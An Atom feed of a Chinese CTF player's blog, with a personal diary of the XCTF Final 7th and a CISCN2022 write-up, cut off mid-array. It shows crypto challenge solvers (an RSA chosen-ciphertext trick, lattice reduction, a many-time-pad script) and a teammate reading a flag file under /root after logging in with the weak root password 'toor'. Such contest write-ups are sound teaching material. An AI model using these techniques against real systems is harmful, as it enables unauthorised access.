<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Dawn_whisper&#39;s blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-04-02T13:57:45.212Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Dawn_whisper</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>XCTF Fianl 7th 祭</title>
    <link href="http://example.com/2023/03/31/XCTF%20Fianl%207th%20%E7%A5%AD/"/>
    <id>http://example.com/2023/03/31/XCTF%20Fianl%207th%20%E7%A5%AD/</id>
    <published>2023-03-31T15:36:35.000Z</published>
    <updated>2023-04-02T13:57:45.212Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XCTF-Fianl-7th-祭"><a href="#XCTF-Fianl-7th-祭" class="headerlink" title="XCTF Fianl 7th 祭"></a>XCTF Fianl 7th 祭</h1><h2 id="Gossip"><a href="#Gossip" class="headerlink" title="Gossip"></a>Gossip</h2><p>在nuaa搞竞赛是否搞错了什么</p><p>今天是3202.3.31，经历了好几天的鬼混生活，写这篇文章的时候我只剩下半条命了（</p><p>总的来说，今年的题目比较烂，但是师傅们一起玩的很开心</p><p>如果是来看wp的师傅们可以直接点旁边目录跳转</p><h2 id="Before"><a href="#Before" class="headerlink" title="Before"></a>Before</h2><p>2023.3.28 终于见到了可爱的可可姐，感觉人生都亮起来了（雾</p><p>上完早八，直接收拾好东西去酒店找可可，dbt说下午马上就能到，于是坐地铁去景枫里面带可可姐逛商场，顺便等等dbt。结果逛了两圈，买了奶茶，吃完了饭，聊累了天，还是没见dbt的人影，于是可可开始催我，我就去群里催dbt。</p><blockquote><p>我：人呢？人呢？人呢？人呢？急急急急急</p><p>DBT：别急 刚下飞机</p><p>DBT：在地铁上 我们9个人</p><p>DBT：先去签到 马上就到了</p><p>DBT：别急 打车呢</p></blockquote><p>这可能就是蒋队的责任心罢，毕竟要先把队友们都安排好，但是来吃饭的时候已经两点半了，商场里的餐馆都下班了，最后带着L的学弟学妹们吃了披萨🍕（</p><p>等吃完饭拉上dbt，去南京南拉上了学弟，再去鸡鸣寺找To1in和桑哥，可惜樱花花季过去了，前几周满树的百花都变成了绿油油的芽，于是还是去玄武湖公园刷了点微信步数，风景不错，但是路上一直在聊天没怎么拍照，丢几张之前拍的樱花好了</p><p><img src="https://cdn.jsdelivr.net/gh/dawnwhisper/img-bed/images/202304021518275.png" alt="image-20230402151809615"></p><p><img src="https://cdn.jsdelivr.net/gh/dawnwhisper/img-bed/images/202304011918631.png" alt="image-20230401191840480"></p><p><img src="https://cdn.jsdelivr.net/gh/dawnwhisper/img-bed/images/202304021518358.png" alt="image-20230402151830581"></p><p>散完了步被To1in带着去恰海鲜，我这个平时一点海鲜都不碰的人那晚上也吃的很开心，只能说跟着本地人不管走多远都能吃到好吃的，在桌上也认识了东南密码大手子rec和sus的队长，大家聊的也都很开心，就是可可姐说要晚上喝酒跟我们一打十，还说完就不认账，<del>我寻思拿雪碧一🥤打十🍺应该也没什么问题是吧</del>。（逃</p><p>吃完之后和Dem0哥哥约了酒局，打算和好兄弟们好好喝一次酒，结果回宾馆的路上发现w&amp;sm的聚餐也改到了今天，<strong>龙哥叫我去，那不得不去</strong>，于是下了地铁便和几个密码手先行分开直奔w&amp;m聚会。</p><p>关于w&amp;m聚会吃饭，我龙哥永远离不开火锅、烤肉、东北菜和海底捞，因为不管每次几个人怎么选，龙哥总会有各种各样的理由最后选到这几个上面去，我建议下次w&amp;m聚会安排吃饭时候直接写个随机数全部安排好<del>（现已加入w&amp;m聚会吃饭菜单）</del>，就不至于每次好几个人扎堆研究吃什么了。</p><blockquote><p>又是w&amp;m线下聚会，请选择与您共进晚餐的人：</p><blockquote><p>Ha1c9on   Yoshino-s   L1near   114   wjh  Snowy_war   yusa   Dawn_whisper</p></blockquote><p>人员选择完毕，请选择您们准备前往的饭店：</p><blockquote><p>火锅   海底捞   烤肉   东北菜</p></blockquote><p>请选择吃完饭之后的活动安排：</p><blockquote><p>上网   上网   上网   上网   上网   上网   上网</p></blockquote><p>您的聚会已经全部安排完毕啦！去享受您的快乐生活吧！</p></blockquote><p>稍微和好兄弟们聊了几句，国防科大的哥哥们也陆陆续续到了，可可姐进来喊我，科大的兄弟们可能也就这一次有机会见面，于是便和w&amp;m的师傅们告别去下一场酒局。</p><p>关于吃饭，除了几个嘴硬的每次喝酒就接一个瓶底，dbt一个人转了一圈，这点我是服的，到我这就跟dbt一次陪了一整杯。结果点菜的时候点玉米，上来就是十几串整个玉米，我看见dbt直接傻在那之后直接就开始嘲笑😝，你小子铁定是没见过真正的北方人是怎么上菜的，最后一人一个指标没完成，还剩下几个没人要，最后让服务员都切成小段才勉强解决掉。你说你也没见过？来个图给你看看。我只能说，这才真正有北方烧烤的感觉</p><p><img src="https://cdn.jsdelivr.net/gh/dawnwhisper/img-bed/images/202304021601152.png" alt="image-20230402160133986"></p><p>再提一嘴，有些人到最后都在嘴硬：</p><p><img src="https://cdn.jsdelivr.net/gh/dawnwhisper/img-bed/images/202304021600491.png" alt="截屏2023-04-02 16.00.39"></p><p>吃完饭坐着聊天，相互加起了微信，师傅们相互介绍的时候，总免不了这几句</p><blockquote><p>你好师傅我是dw，wm做密码的那个</p><p>嗷，就是师傅你啊</p></blockquote><p>这时候再加上dbt几句吹水，师傅们跟我客气几下被觉得好像大家都认识我一样（，科大的师傅们人很好也很有意思，Dem0、rec、等风、init、Evolution等等师傅们也都很帅，于是大伙坐下一聊就聊到了三点半，一个个都说今晚这五个队都喝趴下之后明天排名直接上升五名，结果第二天开赛的时候我看是一个比一个猛（</p><p>晚上这nuaa是回不去了，也没有地铁去SU轰趴馆那边，我直接和dbt进行一个同床共枕，赢！</p><h2 id="Gaming"><a href="#Gaming" class="headerlink" title="Gaming"></a>Gaming</h2><p>早上7点醒来跟着dbt去混了顿酒店早餐，然后送走去现场的参赛选手，再慢慢坐地铁回nuaa上课去，回学校的时候正好9点，稍微躺了一会就去教室里上线比赛了</p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="Three"><a href="#Three" class="headerlink" title="Three"></a>Three</h4><p>他🐎的，这题纯抽象，我真不懂为什么现在出题都能这样出</p><p>简单来说是个mpc，三方安全计算，但是关键代码一行不给，全靠一行英语描述自己猜，再给一个运行过程猜数据</p><p>不想多评价了，感觉出题人纯不会说人话，题目都说不清楚，读半天不知道要说啥，这题放进misc去我绝对不会多说一句话（</p><h4 id="TSA"><a href="#TSA" class="headerlink" title="TSA"></a>TSA</h4><p>搞了个RSA，全文读下来感觉出题人想考个时间二分，类似测信道攻击吧，结果检测的地方没写好，开赛十分钟被非了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ct == enc_flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bye~&quot;</span>)</span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure><p>反手就是一个 $c*2^e$ ，返回来一个 $2m$ ，然后flag就有了…</p><p>真正的考点应该是这个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">modExp</span>(<span class="params">a, e, n</span>):</span><br><span class="line">    karatsuba = <span class="number">10</span></span><br><span class="line">    normal = <span class="number">100</span></span><br><span class="line">    montgomery = <span class="number">2000</span></span><br><span class="line">    <span class="keyword">if</span> a &lt; n:</span><br><span class="line">        delay = karatsuba + montgomery</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        delay = normal + <span class="number">200</span></span><br><span class="line">    time.sleep(delay/<span class="number">10000</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(a, e, n)</span><br></pre></td></tr></table></figure><p>不过比赛也没revenge，懒得写正解exp咯</p><p><img src="https://cdn.jsdelivr.net/gh/dawnwhisper/img-bed/images/202304021633875.png" alt="截屏2023-04-02 16.33.17"></p><p>完蛋，好像真有预期解，那没事了</p><h4 id="noise"><a href="#noise" class="headerlink" title="noise"></a>noise</h4><p>题目给出一个矩阵运算 $AB+X&#x3D;C\mod{N}$ ，然后给出C，在B和X都较小的情况下恢复B，一眼定真，鉴定为强*杯lattice原题，不过那题是 $AB&#x3D;C\mod{N}$ ，但是也有办法<br>$$<br>[A][B]+[X]&#x3D;\begin{bmatrix}A|X\end{bmatrix}\begin{bmatrix}B\\ 1\end{bmatrix}&#x3D;\begin{bmatrix}A|1\end{bmatrix}\begin{bmatrix}B\\ X\end{bmatrix}&#x3D;C\mod{N}<br>$$<br> 这样变换一下就和那题一样了，最后结束的时候dbt说可以给x乘一个小向量，这样就是 $AB\alpha+X\alpha&#x3D;C\alpha\mod{N}$ ，然后让 $X\alpha$ 等于零向量就行了，只能说曾经shallow跟我讲过这个思路，比赛现场的时候还是没想起来。另外感觉自己调参的本事还是太菜了，先丢个exp，后面好好再重新练练吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.modules.free_module_integer <span class="keyword">import</span> IntegerLattice</span><br><span class="line"></span><br><span class="line">n = <span class="number">75</span></span><br><span class="line">m = <span class="number">150</span></span><br><span class="line">r = <span class="number">56</span></span><br><span class="line">N = <span class="number">126633165554229521438977290762059361297987250739820462036000284719563379254544315991201997343356439034674007770120263341747898897565056619503383631412169301973302667340133958109</span></span><br><span class="line"></span><br><span class="line">t1 = [ZZ.random_element(-<span class="number">2</span>^<span class="number">15</span>, <span class="number">2</span>^<span class="number">15</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n*m)]</span><br><span class="line">t2 = [ZZ.random_element(N) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(r*n)]</span><br><span class="line">t3 = [ZZ.random_element(-<span class="number">2</span>^<span class="number">20</span>, <span class="number">2</span>^<span class="number">20</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(r*m)]</span><br><span class="line">B = matrix(ZZ, n, m, t1)</span><br><span class="line">L = IntegerLattice(B)</span><br><span class="line">finalans = L.reduced_basis[<span class="number">0</span>]</span><br><span class="line">A = matrix(ZZ, r, n, t2)</span><br><span class="line">X = matrix(ZZ, r, m, t3)</span><br><span class="line">C = (A * B + X) % N</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">n, m, r, N, C</span>):</span><br><span class="line">    C = C.T</span><br><span class="line">    M = block_matrix([[N*identity_matrix(r), zero_matrix(r, m)], [C, <span class="number">2</span>^<span class="number">15</span> * identity_matrix(m)]])</span><br><span class="line">    temp = M.LLL()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;LLL done&quot;</span>)</span><br><span class="line"></span><br><span class="line">    M = Matrix(ZZ, [temp[i][r:] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">75</span>)]) / <span class="number">2</span>^<span class="number">15</span></span><br><span class="line">    tempM = block_matrix([[<span class="number">2</span>^<span class="number">30</span> * M.T, identity_matrix(<span class="number">150</span>)]])</span><br><span class="line">    res = tempM.LLL()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;LLL done&quot;</span>)</span><br><span class="line"></span><br><span class="line">    res1 = Matrix(ZZ, [res[i][<span class="number">75</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">75</span>)])</span><br><span class="line">    res1 = res1.BKZ(block_size = <span class="number">10</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;BKZ done&quot;</span>)</span><br><span class="line">    tar = IntegerLattice(res1).reduced_basis[<span class="number">0</span>]</span><br><span class="line">    tar_inv = [-i <span class="keyword">for</span> i <span class="keyword">in</span> tar]</span><br><span class="line">    <span class="keyword">return</span> tar, tar_inv</span><br><span class="line"></span><br><span class="line">ans1, ans2 = attack(n, m, r, N, C)</span><br></pre></td></tr></table></figure><p><del>平等的恨每一道我调不出来的需要调参的题目</del></p><h2 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h2><p>W&amp;M万年老五，我背大锅，没进前四去打KOH，可惜，归根到底只能说还是自己太菜了（</p><p><img src="https://cdn.jsdelivr.net/gh/dawnwhisper/img-bed/images/202304021647511.png" alt="image-20230402164735355"></p><p>第二天Dota2跟我们密码手没什么关系，也就是直播看看乐子，我也没怎么去写脚本，摸摸鱼啦，结果还是第五（</p><p><img src="https://cdn.jsdelivr.net/gh/dawnwhisper/img-bed/images/202304021647119.png" alt="image-20230402164655201"></p><h2 id="After"><a href="#After" class="headerlink" title="After"></a>After</h2><p>2023.3.30 比赛结束咯，开始新一轮的鬼混2.0（</p><p>比赛结束之后，去现场找到了很多很多的师傅们，甚至还和脑王合影<del>追星成功</del>了，领完奖之后，龙哥说抽奖也没什么好东西，于是我们几个没去晚宴，回宾馆商量了下晚上去哪吃饭，不过过程如上所述，最后选到了东北烧烤（，y老师带着他的女朋友，wjh师傅带着他的女朋友，龙哥雪姐姐和yusa也聊得很开心，只剩下我一个人背个包在前面领路，<del>属于是输麻了</del>，坐下之后在群里喊或或，据说是要坐二十多站地铁，于是我们先吃起来了，饭桌上大家畅谈人生，发现大家都有着不止一技之长，还能畅谈各大公司开出的不少资薪，<del>这下又属于是输麻了2.0</del>，不过好一点的是，各位w&amp;m的师傅们对我都很好，希望读完书后的生活能过得好一点吧</p><p>恰饭的时候或或和114也都陆陆续续到了，恰完了饭被龙哥拉去打游戏，吃完晚宴后dbt和南邮的很多师傅们去百家湖喝酒，于是一个劲的给我发消息打电话，甚至让我喊上龙哥一起去，但是最后还是只有我一个打了个车回到百家湖，晚上的细节我已经不想仔细描述了，感觉只有最后在门口dbt说谎不眨眼那段可以封神。简单来说有个着装很暴露的妹妹<del>（感觉浑身上下就穿了个肚兜，我怕我多看一眼要说我色狼（）</del>来我们这桌加微信，试图约dbt去下周音乐节，实际上dbt明天就走却和人家约了下周一起，说的真真切切看的我都快信了（，最后大家一起和天命的师傅们合了照，于是便一起打车回酒店了</p><p>大晚上四点我一个人没地方住，最后还得感谢雪姐姐从睡梦里醒来让我有个地方睡下（</p><p>2023.3.31 早上听说我的闹钟响了两个小时，把雪姐姐叫醒了我还是一动不动，<del>不过我早八的签到还是签上了，大成功！</del></p><p>在酒店休息好的时候已经中午了，正好赶上帆哥哥回南京、小学弟路过南航，于是一起在托乐嘉吃了顿饭。很喜欢帆哥哥见面时的说的话：“你居然还没死呢”</p><p><img src="https://cdn.jsdelivr.net/gh/dawnwhisper/img-bed/images/202304022146291.png" alt="image-20230402214618544"></p><p>下午回学校上完了课，把校队里的事情忙完了之后，感觉自己就剩下半条命了，结果又被dbt他们叫了出去，说是安排了一晚上的活动，反正我是顶不住了，本来打算最后夜不归宿最后一次，结果livehouse自己又给自己破防了（，被兄弟们安慰了会，还是觉得回学校好好休息比较好，晚上和shallow👴聊了蛮久，谁知道这次有没有想通呢，管她呢，明天爬起来接着卷绩点再说吧…</p><h2 id="Soliloquy"><a href="#Soliloquy" class="headerlink" title="Soliloquy"></a>Soliloquy</h2><blockquote><p><em>我试着 一个人 一整天 都不失落</em><br><em>就让我 喝醉了 唱着歌 自娱自乐</em><br><em>开始怀疑了 被爱情击倒了</em><br><em>无可奈何 💔</em></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XCTF-Fianl-7th-祭&quot;&gt;&lt;a href=&quot;#XCTF-Fianl-7th-祭&quot; class=&quot;headerlink&quot; title=&quot;XCTF Fianl 7th 祭&quot;&gt;&lt;/a&gt;XCTF Fianl 7th 祭&lt;/h1&gt;&lt;h2 id=&quot;Gossip&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="Life" scheme="http://example.com/categories/Life/"/>
    
    
    <category term="Life" scheme="http://example.com/tags/Life/"/>
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>First price at CISCN2022!</title>
    <link href="http://example.com/2022/08/27/First%20price%20at%20CISCN2022!/"/>
    <id>http://example.com/2022/08/27/First%20price%20at%20CISCN2022!/</id>
    <published>2022-08-27T09:43:54.000Z</published>
    <updated>2022-09-01T06:10:47.155Z</updated>
    
    <content type="html"><![CDATA[<h1 id="First-price-at-CISCN2022"><a href="#First-price-at-CISCN2022" class="headerlink" title="First price at CISCN2022!"></a>First price at CISCN2022!</h1><p>👴开门见山就是一句：👴今年是国一！</p><p>虽然今年是我打过最抽象的ctf，但是👴国一，👴不计较！</p><h2 id="初赛"><a href="#初赛" class="headerlink" title="初赛"></a>初赛</h2><h3 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h3><h4 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h4><p>签到题就是个抽象玩意，整了个什么电报机，发一串密文过去就行</p><h4 id="ISO9798"><a href="#ISO9798" class="headerlink" title="ISO9798"></a>ISO9798</h4><p>抽象黑盒aes，随便打一串东西过去，然后按顺序把第二块和第一块再打回去就行了（</p><h3 id="可信计算"><a href="#可信计算" class="headerlink" title="可信计算"></a>可信计算</h3><p>这可能是最抽象的两道题</p><h4 id="基于挑战码的双向认证"><a href="#基于挑战码的双向认证" class="headerlink" title="基于挑战码的双向认证"></a>基于挑战码的双向认证</h4><p>我还在研究题目的时候，我队pwn手突然告诉我他出了，我：？</p><p>过去一问，<code>cat /root/cube-shell/instance/flag_server/flag2.txt</code></p><p>给哥们人看傻了</p><h4 id="基于挑战码的双向认证2"><a href="#基于挑战码的双向认证2" class="headerlink" title="基于挑战码的双向认证2"></a>基于挑战码的双向认证2</h4><p>发现是修了flag文件的权限，哥们就继续看题去了，vim打开的时候一堆告警，然后ls一看，我超，<code>.swp</code>文件赫然屹立在那，反手一个还原准备diff研究，结果又没过多久，pwn手跟我说又出了，我：？？？</p><p>过去一问，root弱密码，密码是toor</p><p>？？？？？</p><p>后来知乎看到个好笑的：</p><blockquote><ul><li>哎，linux怎么提权啊？</li><li>没想到你还会pwn？</li><li>没，我在做crypto</li></ul></blockquote><p>本次比赛成为自我打ctf以来首个没写一行脚本ak了的比赛，好好好，这题出的好，下次不要再出了</p><h2 id="半决赛"><a href="#半决赛" class="headerlink" title="半决赛"></a>半决赛</h2><p>首先，再丢wp之前，重中之重的第一件事，都给👴狠狠地把<a href="https://www.zhihu.com/question/534947036">知乎</a>全部看一遍，协办的抽象人，抽象事，还得是我们华东百</p><p>所以什么时候才能回到2021华东百永远的家啊（悲</p><h3 id="crypto-1"><a href="#crypto-1" class="headerlink" title="crypto"></a>crypto</h3><h4 id="old"><a href="#old" class="headerlink" title="old"></a>old</h4><p>👴就是古典大师！👴就是猜谜的神！</p><p>base64+w型栅栏+凯撒</p><h4 id="run-faster"><a href="#run-faster" class="headerlink" title="run_faster"></a>run_faster</h4><p>开局一堆base64，解密全靠猜</p><p>many time pad attack</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Crypto.Util.strxor <span class="keyword">as</span> xo</span><br><span class="line"><span class="keyword">import</span> libnum, codecs, numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isChr</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">infer</span>(<span class="params">index, pos</span>):</span><br><span class="line">    <span class="keyword">if</span> msg[index, pos] != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">know</span>(<span class="params">index, pos, ch</span>):</span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(ch)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(ch)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dat = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSpace</span>():</span><br><span class="line">    <span class="keyword">for</span> index, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(c):</span><br><span class="line">        res = [xo.strxor(x, y) <span class="keyword">for</span> y <span class="keyword">in</span> c <span class="keyword">if</span> x!=y]</span><br><span class="line">        f = <span class="keyword">lambda</span> pos: <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(isChr, [s[pos] <span class="keyword">for</span> s <span class="keyword">in</span> res])))</span><br><span class="line">        cnt = [f(pos) <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">            dat.append((f(pos), index, pos))</span><br><span class="line"></span><br><span class="line">c = [codecs.decode(x.strip().encode(), <span class="string">&#x27;hex&#x27;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;ciphertext.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()]</span><br><span class="line"></span><br><span class="line">msg = np.zeros([<span class="built_in">len</span>(c), <span class="built_in">len</span>(c[<span class="number">0</span>])], dtype=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">getSpace()</span><br><span class="line"></span><br><span class="line">dat = <span class="built_in">sorted</span>(dat)[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> w, index, pos <span class="keyword">in</span> dat:</span><br><span class="line">    infer(index, pos)</span><br><span class="line"></span><br><span class="line">know(<span class="number">0</span>, <span class="number">1</span>, <span class="string">&#x27;h&#x27;</span>)</span><br><span class="line">know(<span class="number">2</span>, <span class="number">14</span>, <span class="string">&#x27;o&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join([<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> x]) <span class="keyword">for</span> x <span class="keyword">in</span> msg]))</span><br><span class="line"></span><br><span class="line">key = xo.strxor(c[<span class="number">0</span>], <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> msg[<span class="number">0</span>]]).encode())</span><br><span class="line"><span class="built_in">print</span>(key)</span><br></pre></td></tr></table></figure><p>拿到密码<code>W@_0u_Y0u_C@n_R3@11y_D@nc3_b@by</code></p><p>解压之后的东西显然一个是字典一个是hash，john爆破就完了</p><h4 id="share-Masker"><a href="#share-Masker" class="headerlink" title="share_Masker"></a>share_Masker</h4><p>这题很离谱，t非常小，导致加密性很差，只要有t个人的数据基本就能恢复函数<code>f(x)</code>了，题目最后改了<code>y0</code>和<code>y1</code>，但是后面还有很多的数据，直接用后面的就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">sigma = [(<span class="number">7</span>,[<span class="number">297321905442622086655777122878347065868</span>,<span class="number">311772637731397992755988835643237309539</span>,<span class="number">258409395646949644587189814494650948892</span>,<span class="number">229661884007090559984271007393218884878</span>,<span class="number">210755618260134386557578317684284231344</span>,<span class="number">42629503464484411074530409224833347744</span>,<span class="number">87967363214749550457151328532891556884</span>],[<span class="number">157737545918213953755327108333947991114</span>,<span class="number">317872077880940679809614010825371698417</span>,<span class="number">86624037161883155206577260542472171215</span>,<span class="number">317028281506890684277032990811191697980</span>,<span class="number">258465451871053539349471730150916835415</span>,<span class="number">153264157207783262444002861546206936120</span>,<span class="number">289000922263555251522752972082118420994</span>]),(<span class="number">6</span>,[<span class="number">284334878252345214914712482285696924991</span>,<span class="number">165926984986379306821357416122362386359</span>,<span class="number">193637829384529193495630025917170738695</span>,<span class="number">334882665693477520093059906349807755805</span>,<span class="number">268900344625159440411103370834067861440</span>,<span class="number">91280291221404377771897658696028311940</span>,<span class="number">194953122620210846204934290972270327939</span>],[<span class="number">262772073226095364909240613130896626446</span>,<span class="number">25045221876552835532755896106687587027</span>,<span class="number">290132234127387762127754534163582347803</span>,<span class="number">80323928284560765486185338101062119046</span>,<span class="number">63130854914629293225876778792832543500</span>,<span class="number">194242464018353077430988407022608500272</span>,<span class="number">240358378198563571900194429955390922636</span>]),(<span class="number">17035696356725523435736689352030103776</span>,[<span class="number">16310928756724449650677618214978002701</span>,<span class="number">174336045848228030779714764020238703557</span>,<span class="number">89970216714490906504041327043501903033</span>,<span class="number">282986139634559662214090998546272252057</span>,<span class="number">339756653680570402572151189598090053491</span>,<span class="number">226753195189776187233360667707631451395</span>,<span class="number">302393844239337444779445791166076726499</span>],[<span class="number">83693785572982730284187343563453427812</span>,<span class="number">214382896695971150381852644184906500093</span>,<span class="number">31159746526526831505464896928473401209</span>,<span class="number">109689344372495890477346170739794680979</span>,<span class="number">29464723212738599605243411728123573920</span>,<span class="number">75125389557289762047890120501768842472</span>,<span class="number">83648594694726104892013738976521242930</span>]),(<span class="number">38112363242026170740607299231457590593</span>,[<span class="number">280000669740991152715116414064868844069</span>,<span class="number">117811978751516994318608886491996928160</span>,<span class="number">219066592573340196843386896082513768757</span>,<span class="number">266149851847970337077776861076744575928</span>,<span class="number">273302369856624536044807995922274461035</span>,<span class="number">173837090212655468667252338987442545651</span>,<span class="number">50087494512497153546666189839574987813</span>],[<span class="number">73484909955976133758554085839755813985</span>,<span 